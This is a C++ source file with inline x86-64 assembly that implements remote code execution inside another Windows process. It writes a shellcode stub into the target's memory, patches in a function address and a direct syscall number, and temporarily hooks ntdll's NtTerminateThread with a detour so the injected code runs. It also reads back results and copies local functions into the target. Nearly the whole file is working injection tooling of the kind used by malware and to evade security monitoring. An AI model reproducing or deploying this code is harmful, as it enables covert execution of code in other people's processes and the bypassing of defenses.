#include "helpers.hpp"
#include "debug.hpp"
#include <vector>
#include "shellcodePrepare.hpp"
#define DATA_SECTION 0x400
#define SDATA_SECTION "0x400"
#define HOOKED_FUNC "NtTerminateThread"


void __attribute__((naked)) remoteExec()
{
    asm("call %P0" : : "i"(((uintptr_t)(remoteExec))+5));
    asm("pop rax"); //We are getting RIP here.
    asm("mov ax, 0");
    asm("add rax, " SDATA_SECTION);
    asm("LOCK add QWORD PTR [rax+8], 1"); //We atomically increment our crude lock, setting the CF if used for the first time.
    asm("jc %P0" : : "i"(((uintptr_t)(remoteExec))+0x27));
    asm("mov r10,rcx");
    asm("mov eax, 0x49494949"); //This is "IIII".
    asm("syscall"); //Direct system call.
    asm("ret");
    asm("push rcx"); //Save params.
    asm("push rdx"); //Save params.
    asm("push r8"); //Save params.
    asm("push r9"); //Save params.
    asm("push rbx"); //rbx is calee-saved and we'll need it once we called the API
    asm("mov rbx, rax");
    asm("sub rsp, 0x20"); //Shadow space.
    asm("mov rcx, [rbx+0x18]"); //Param 1
    asm("mov rdx, [rbx+0x20]"); //Param 2
    asm("mov r8, [rbx+0x28]"); //Param 3
    asm("mov r9, [rbx+0x30]"); //Param 4
    asm("push QWORD PTR [rbx+0x60]"); //Param 10
    asm("push QWORD PTR [rbx+0x58]"); //Param 9
    asm("push QWORD PTR [rbx+0x50]"); //Param 8
    asm("push QWORD PTR [rbx+0x48]"); //Param 7
    asm("push QWORD PTR [rbx+0x40]"); //Param 6
    asm("push QWORD PTR [rbx+0x38]"); //Param 5
    asm("mov rax, 0x4848484848484848"); //This is "HHHHHHHH".
    asm("call rax");
    asm("add rsp, 0x50"); //Caller cleanup.
    asm("mov QWORD PTR [rbx], rax"); //We save the return value.
    asm("mov rax, gs:[0x30]");
    asm("mov eax, DWORD PTR [rax+0x68]");
    asm("mov DWORD PTR [rbx+0x10], eax");
    asm("pop rbx"); //Restore rbx.
    asm("pop r9"); //Restore param.
    asm("pop r8"); //Restore param.
    asm("pop rdx"); //Restore param.
    asm("pop rcx"); //Restore param.
    asm("mov r10,rcx");
    asm("mov eax, 0x49494949"); //This is "IIII".
    asm("syscall"); //Direct system call.
    asm("ret"); //Return to normal flow.
}

uintptr_t prepareFunction(DWORD dwPid, DWORD dwSyscall, uintptr_t remoteFunc, string sParams)
{
    string sRemoteLoadFunc((char*) remoteExec, DATA_SECTION); //Who said C is not beautiful? Initialize an std::string with a char pointer static casted from a function pointer. IDDQD.
    string sloadLibraryAAdd((char*)(&remoteFunc), sizeof(remoteFunc)); //Another IDDQD moment.
    replacestr(sRemoteLoadFunc, "HHHHHHHH", sloadLibraryAAdd); //Place the remote function where the "H"s are.
    string sSysCall((char*)(&dwSyscall), sizeof(dwSyscall)); //Another IDDQD moment.
    replacestr(sRemoteLoadFunc, "IIII", sSysCall); //Replace the syscall number with the correct one.
    replacestr(sRemoteLoadFunc, "IIII", sSysCall); //Replace the syscall number with the correct one.
    uintptr_t memory = -2;
    sRemoteLoadFunc.append((char*)(&memory), sizeof(memory)); //Code war crime here. This will be the "memory" space for the returned base address.
    memory = -1;
    sRemoteLoadFunc.append((char*)(&memory), sizeof(memory)); //This will be the 8 more bytes of global memory for a crude lock.
    memory = 0;
    sRemoteLoadFunc.append((char*)(&memory), sizeof(memory)); //This will be the 8 more bytes to save GetLastError()
    sRemoteLoadFunc.append(sParams); //And here goes the rest of the params
    return writeToProcess(dwPid, sRemoteLoadFunc, 0);
}

bool remoteExecute(DWORD dwPid, uintptr_t ptr)
{
    uintptr_t hookedAPI = (uintptr_t) GetProcAddress(GetModuleHandle("ntdll.dll"), HOOKED_FUNC);
    if(hookedAPI)
    {
        unsigned char szHook[] = {0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x50, 0xC3, 0xC3, 0xC3};
        memcpy(szHook+2, &ptr, sizeof(uintptr_t));
        string sHook((char*)szHook, sizeof(szHook)-1);
        string sBack;
        if(readFromProcess(dwPid, sBack, hookedAPI, (DWORD) sHook.size())) //Backup the original memory at the detour.
        {
            if(writeToProcess(dwPid, sHook, hookedAPI)) //Write the detour.
            {
                manuallyTrigger(dwPid);
                bool bRestored = false;
                while(true)
                {
                    string sMem;
                    if(readFromProcess(dwPid, sMem, ptr+DATA_SECTION, sizeof(uintptr_t)*2))
                    {
                        uintptr_t shadowLoadDllAdd = 0;
                        uintptr_t rusticLock = -1;
                        memcpy(&shadowLoadDllAdd, sMem.c_str(), sizeof(uintptr_t)); //The returned value.
                        memcpy(&rusticLock, sMem.c_str()+sizeof(uintptr_t), sizeof(uintptr_t)); //Our rustic lock.
                        if(rusticLock != -1llu && !bRestored)
                        {
                            writeToProcess(dwPid, sBack, hookedAPI); //Otherwise we restore the original memory at the detour and we break.
                            bRestored = true;
                        }
                        if(shadowLoadDllAdd != -2llu) break;
                    }
                }
            }
        }
    }
    return true;
}

uintptr_t execWithParams(DWORD dwPid, uintptr_t remoteFunc, uintptr_t* dwGLE, vector<uintptr_t> args)
{
    #ifdef VERBOSE
    cout << "Executing address 0x" << (hex) << remoteFunc << " in PID 0x" << dwPid << " (" << (dec) << dwPid << ")" << endl;
    for(auto & elem : args) cout << "Param 0x" << (hex) << elem << endl;
    #endif // VERBOSE
    DWORD dwSyscall = 0;
    if(getSyscallNumber(HOOKED_FUNC, &dwSyscall))
    {
        string sParams;
        for(auto & element : args) sParams.append((char*)&element, sizeof(uintptr_t));
        uintptr_t injectedFunction = prepareFunction(dwPid, dwSyscall, remoteFunc, sParams);
        #ifdef VERBOSE
        cout << "Prepared function in 0x" << (hex) << injectedFunction << endl;
        #endif // VERBOSE
        if(remoteExecute(dwPid, injectedFunction))
        {
            string sMem;
            uintptr_t shadowLoadDllAdd = 0;
            if(readFromProcess(dwPid, sMem, injectedFunction+DATA_SECTION, sizeof(uintptr_t)*3))
            {
                memcpy(&shadowLoadDllAdd, sMem.c_str(), sizeof(uintptr_t));
                if(dwGLE) memcpy(dwGLE, sMem.c_str()+sizeof(uintptr_t)*2, sizeof(uintptr_t));
            }
            debugcry("readFromProcess");
            #ifdef VERBOSE
            cout << "return = 0x" << (hex) << shadowLoadDllAdd << endl;
            if(dwGLE) cout << "Remote GetLastError = " << (dec) << *dwGLE << endl;
            #endif
            remoteFree(dwPid, injectedFunction);
            return shadowLoadDllAdd;
        }
        debugcry("remoteExecute");
    }
    debugcry("getSyscallNumber");
    return 0;
}

uintptr_t copyAndExecWithParams(DWORD dwPid, LPCVOID localFunc, uintptr_t* dwGLE, vector<uintptr_t> args)
{
    string sFunc((char*)localFunc, 0x400);
    replaceIATCalls(sFunc, (uintptr_t)localFunc);
    uintptr_t remoteFunc = writeToProcess(dwPid, sFunc, 0);
    if(remoteFunc)
    {
        uintptr_t retVal = execWithParams(dwPid, remoteFunc, dwGLE, args);
        remoteFree(dwPid, remoteFunc);
        return retVal;
    }
    debugcry("writeToProcess");
    return 0;
}

uintptr_t allocateParam(DWORD dwPid, string sParam)
{
    return writeToProcess(dwPid, sParam, 0);
}

void freeParam(DWORD dwPid, uintptr_t paramAdd)
{
    remoteFree(dwPid, paramAdd);
}
